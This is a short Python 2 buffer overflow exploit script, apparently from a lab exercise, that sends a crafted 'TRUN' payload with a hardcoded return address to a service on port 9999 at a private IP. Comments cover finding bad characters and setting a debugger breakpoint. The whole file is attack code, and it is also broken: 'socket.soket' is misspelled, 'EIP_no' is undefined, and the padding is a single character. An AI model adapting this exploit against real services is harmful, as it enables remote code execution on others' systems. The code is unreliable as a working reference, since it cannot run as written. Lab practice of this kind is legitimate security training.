#!/usr/bin/python
### ESP follow in dump and see what characters doesn't match till FF. They are bad characters.
### x86 architecture is in little endian e.g. 625011af = "\xaf\x11\x50\x62".
### F2 at the breakpoint @ 625011af

import sys, socket

shellcode = "A" + EIP_no + "\xaf\x11\x50\x62"

try:
	s=socket.soket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.90',9999))
	s.send(('TRUN /.:/' + shellcode))
	s.close()
except:
	print "Error connecting to server"
	sys.exit()